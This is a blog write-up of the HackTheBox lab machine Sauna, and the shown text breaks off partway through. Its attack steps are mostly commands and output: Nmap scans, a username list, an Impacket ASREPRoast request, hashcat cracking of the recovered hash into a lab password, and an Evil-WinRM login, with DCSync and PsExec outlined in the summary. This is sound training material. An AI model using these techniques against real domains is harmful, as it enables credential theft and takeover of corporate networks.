@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB: Sauna Writeup · mattjohnson.cloud
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="matt johnson">
+<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s Sauna.">
+<meta name="keywords" content="blog,cloud,personal,security,windows,chess">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Sauna Writeup">
+  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s Sauna.">
+
+<meta property="og:url" content="http://www.mattjohnson.de/posts/htb-sauna/">
+  <meta property="og:site_name" content="mattjohnson.cloud">
+  <meta property="og:title" content="HTB: Sauna Writeup">
+  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s Sauna.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-07-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-07-18T00:00:00+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Security">
+
+
+
+
+<link rel="canonical" href="http://www.mattjohnson.de/posts/htb-sauna/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.7763f8bc6341ecf82378e867c285e1549abb063a899be313ccd25dbfcd24fa7d.css" integrity="sha256-d2P4vGNB7PgjeOhnwoXhVJq7BjqJm&#43;MTzNJdv80k&#43;n0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.mattjohnson.de/">
+      mattjohnson.cloud
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">tags</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.mattjohnson.de/posts/htb-sauna/">
+              HTB: Sauna Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2020-07-18T00:00:00Z">
+                July 18, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              11-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/matt-johnson/">Matt Johnson</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <div class="custom-toc">
+    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#high-level-information">High-Level Information</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#discussion">Discussion</a>
+      <ol>
+        <li><a href="#topic-1-asreproastable">Topic #1: ASREPRoastable</a></li>
+        <li><a href="#topic-2-domain-object-privileges--ms-drsr">Topic #2: Domain Object Privileges &amp; MS-DRSR</a></li>
+        <li><a href="#topic-3-beyond-root">Topic #3: Beyond Root</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+</div>
+<h1 id="high-level-information">
+  High-Level Information
+  <a class="heading-link" href="#high-level-information">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Machine Name: Sauna</p>
+<p>IP Address: 10.10.10.175</p>
+<p>Difficulty: Medium</p>
+<p>Summary: HackTheBox&rsquo;s Sauna was retired today, and it was an excellent machine for practicing Active Directory (and domain controller) exploitation. Rooting the box did not require any vulnerability exploitation at all, rather it relied on tried and true AD exploitation tactics. Getting an initial foothold on the box required enumerating employee names, creating a list of potential usernames based on common naming conventions, and using that list to perform an ASREPRoast attack against the Kerberos service. After gaining a hash for one user, <code>fsmith</code>, I managed to crack it and utilize Evil-WinRM to get a low shell. During internal enumeration, running winPEAS gave me another set of credentials for a service account, <code>svc_loanmgr</code>. I logged in as that account, loaded Bloodhound, and determined that the account&rsquo;s permissions allowed me to perform a DCSync attack and dump all user credentials. After obtaining the <code>Administrator</code> account&rsquo;s NTLM hash, I gained a root shell via PsExec.</p>
+<p>Tools Used: Nmap, Impacket, Hashcat, <a href="https://github.com/Hackplayers/evil-winrm"  class="external-link" target="_blank" rel="noopener">Evil-WinRM</a>, <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"  class="external-link" target="_blank" rel="noopener">winPEAS</a>, <a href="https://github.com/BloodHoundAD/BloodHound"  class="external-link" target="_blank" rel="noopener">Bloodhound</a></p>
+<h1 id="initial-foothold">
+  Initial Foothold
+  <a class="heading-link" href="#initial-foothold">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>As always, I began by running Nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:/opt$ ./stagednmap.sh 10.10.10.175
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-05-29 18:45 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.175
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.13s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: 65518 filtered ports
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp    open  domain
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown
+</span></span><span style="display:flex;"><span>49673/tcp open  unknown
+</span></span><span style="display:flex;"><span>49676/tcp open  unknown
+</span></span><span style="display:flex;"><span>49686/tcp open  unknown
+</span></span><span style="display:flex;"><span>58943/tcp open  unknown
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: 1 IP address <span style="color:#ff7b72;font-weight:bold">(</span>1 host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 222.56 seconds
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-05-29 18:49 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.175
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.16s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain?
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   DNSVersionBindReqTCP:
+</span></span><span style="display:flex;"><span>|     version
+</span></span><span style="display:flex;"><span>|_    bind
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: Egotistical Bank :: Home
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#ff7b72;font-weight:bold">(</span>server time: 2020-05-30 07:52:35Z<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#ff7b72;font-weight:bold">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#ff7b72;font-weight:bold">(</span>SSDP/UPnP<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49676/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49686/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>58943/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port53-TCP:V<span style="color:#ff7b72;font-weight:bold">=</span>7.80%I<span style="color:#ff7b72;font-weight:bold">=</span>7%D<span style="color:#ff7b72;font-weight:bold">=</span>5/29%Time<span style="color:#ff7b72;font-weight:bold">=</span>5ED19F92%P<span style="color:#ff7b72;font-weight:bold">=</span>x86_64-pc-linux-gnu%r<span style="color:#ff7b72;font-weight:bold">(</span>DNSV
+</span></span><span style="display:flex;"><span>SF:ersionBindReqTCP,20,<span style="color:#a5d6ff">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SF:x04bind\0\0\x10\0\x03&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: 8h03m01s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2.02:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2020-05-30T07:54:59
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: 1 IP address <span style="color:#ff7b72;font-weight:bold">(</span>1 host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 310.45 seconds
+</span></span><span style="display:flex;"><span>         
+</span></span></code></pre></div><p>Based on the number of open ports and the services running on them, I assumed that this was a Domain Controller. As such, I attempted to enumerate the usual suspects: SMB and LDAP. Unfortunately, both of these were pretty locked down. The only information I managed to get was the domain components: <code>DC=EGOTISTICAL-BANK,DC=LOCAL</code>.</p>
+<p>Moving on, I enumerated the website.</p>
+<p><img src="site-home.png" alt=""> <img src="site-404.png" alt=""> <img src="site-employees.png" alt=""></p>
+<p>Once again, however, there didn&rsquo;t seem to be any exploitation vectors. After further enumerating the website and still finding nothing, I made a list of potential usernames based on the employee names found on the website.</p>
+<pre tabindex="0"><code>fergussmith
+fergus.smith
+fsmith
+shauncoins
+shaun.coins
+scoins
+hugobear
+hugo.bear
+hbear
+bowietaylor
+bowie.taylor
+btaylor
+sophiedriver
+sophie.driver
+sdriver
+stevenkerb
+steven.kerb
+skerb
+</code></pre><p>Using this list of potential usernames, I attempted to perform an ASREPRoast attack and got a hit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:/usr/share/doc/python3-impacket/examples$ python3 GetNPUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -no-pass -usersfile ~/htb/Sauna/possible-usernames.txt
+</span></span><span style="display:flex;"><span>Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:923a85dc41147afdc6a6772dffb1ceb7<span style="color:#79c0ff">$9</span>fc33b7929d1d0f58152e7fbfe5c5ab5ae862afef33cadd8f8032aa977a895d5602b3f94f19466c1c91333a27be690267f492c75d0919b5ee4f06a38fc89f83157ef59af0f83310edd39f1d3195c8725d1f1b83c9abbb9a2a32ec7ad722e0a813d4ad23897bd78755f926fac3a79565c7b2cb878a6b8ab925509bf25e7072bdbd853c4f17ed88705719b6d01057a7932c29a18fee3e706fa40e38fd0f390d7d52b1ef9bee8cf4501ea3fca9cc8905d974a3c12da6ef2b489e5c4185f71a11be523f01600b93277b1ebe2ebbd6b3e5028cced498d8cde5ce46734369c3c749bd5dafa439fc3b32959f507f243fc461f7547938a0b78d133b893bb33c954e0f48e
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#ff7b72;font-weight:bold">(</span>Client not found in Kerberos database<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span></code></pre></div><p>I was easily able to crack the hash using hashcat. After that, I utilized Evil-WinRM to gain a remote shell, which was possible due to the WSMan service being enabled:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/Sauna$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#ff7b72;font-weight:bold">(</span>v5.1.0<span style="color:#ff7b72;font-weight:bold">)</span> starting...
+</span></span><span style="display:flex;"><span>OpenCL Platform <span style="color:#8b949e;font-style:italic">#1: The pocl project</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">====================================</span>
+</span></span><span style="display:flex;"><span>* Device <span style="color:#8b949e;font-style:italic">#1: pthread-Intel(R) Core(TM) i7-8665U CPU @ 1.90GHz, 2048/5891 MB allocatable, 4MCU</span>
+</span></span><span style="display:flex;"><span>Hashes: 1 digests; 1 unique digests, 1 unique salts
+</span></span><span style="display:flex;"><span>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+</span></span><span style="display:flex;"><span>Rules: <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>Applicable optimizers:
+</span></span><span style="display:flex;"><span>* Zero-Byte
+</span></span><span style="display:flex;"><span>* Not-Iterated
+</span></span><span style="display:flex;"><span>* Single-Hash
+</span></span><span style="display:flex;"><span>* Single-Salt
+</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#a5d6ff">256</span>
+</span></span><span style="display:flex;"><span>ATTENTION! Pure <span style="color:#ff7b72;font-weight:bold">(</span>unoptimized<span style="color:#ff7b72;font-weight:bold">)</span> OpenCL kernels selected.
+</span></span><span style="display:flex;"><span>This enables cracking passwords and salts &gt; length 32 but <span style="color:#ff7b72">for</span> the price of drastically reduced performance.
+</span></span><span style="display:flex;"><span>If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+</span></span><span style="display:flex;"><span>Watchdog: Hardware monitoring interface not found on your system.
+</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger disabled.
+</span></span><span style="display:flex;"><span>* Device <span style="color:#8b949e;font-style:italic">#1: build_opts &#39;-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll&#39;</span>
+</span></span><span style="display:flex;"><span>Dictionary cache built:
+</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#a5d6ff">14344392</span>
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#a5d6ff">139921507</span>
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#a5d6ff">14344385</span>
+</span></span><span style="display:flex;"><span>* Runtime...: 6 secs
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:923a85dc41147afdc6a6772dffb1ceb7<span style="color:#79c0ff">$9</span>fc33b7929d1d0f58152e7fbfe5c5ab5ae862afef33cadd8f8032aa977a895d5602b3f94f19466c1c91333a27be690267f492c75d0919b5ee4f06a38fc89f83157ef59af0f83310edd39f1d3195c8725d1f1b83c9abbb9a2a32ec7ad722e0a813d4ad23897bd78755f926fac3a79565c7b2cb878a6b8ab925509bf25e7072bdbd853c4f17ed88705719b6d01057a7932c29a18fee3e706fa40e38fd0f390d7d52b1ef9bee8cf4501ea3fca9cc8905d974a3c12da6ef2b489e5c4185f71a11be523f01600b93277b1ebe2ebbd6b3e5028cced498d8cde5ce46734369c3c749bd5dafa439fc3b32959f507f243fc461f7547938a0b78d133b893bb33c954e0f48e:Thestrokes23
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Type........: Kerberos 5 AS-REP etype <span style="color:#a5d6ff">23</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: <span style="color:#79c0ff">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:923a85d...e0f48e
+</span></span><span style="display:flex;"><span>Time.Started.....: Sun May 31 13:42:32 2020 <span style="color:#ff7b72;font-weight:bold">(</span>52 secs<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Sun May 31 13:43:24 2020 <span style="color:#ff7b72;font-weight:bold">(</span>0 secs<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#ff7b72;font-weight:bold">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#ff7b72;font-weight:bold">(</span>100.00%<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Speed.#1.........:   204.8 kH/s <span style="color:#ff7b72;font-weight:bold">(</span>5.89ms<span style="color:#ff7b72;font-weight:bold">)</span> @ Accel:13 Loops:1 Thr:64 Vec:8
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 <span style="color:#ff7b72;font-weight:bold">(</span>100.00%<span style="color:#ff7b72;font-weight:bold">)</span> Digests, 1/1 <span style="color:#ff7b72;font-weight:bold">(</span>100.00%<span style="color:#ff7b72;font-weight:bold">)</span> Salts
+</span></span><span style="display:flex;"><span>Progress.........: 10539776/14344385 <span style="color:#ff7b72;font-weight:bold">(</span>73.48%<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Rejected.........: 0/10539776 <span style="color:#ff7b72;font-weight:bold">(</span>0.00%<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Restore.Point....: 10536448/14344385 <span style="color:#ff7b72;font-weight:bold">(</span>73.45%<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>Candidates.#1....: Tiggerjojo17 -&gt; TheBlueNoise
+</span></span><span style="display:flex;"><span>Started: Sun May 31 13:42:22 <span style="color:#a5d6ff">2020</span>
+</span></span><span style="display:flex;"><span>Stopped: Sun May 31 13:43:25 <span style="color:#a5d6ff">2020</span>
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/Sauna$ 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:/opt$ evil-winrm -i 10.10.10.175 -u fsmith
+</span></span><span style="display:flex;"><span>Enter Password:
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v2.3
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
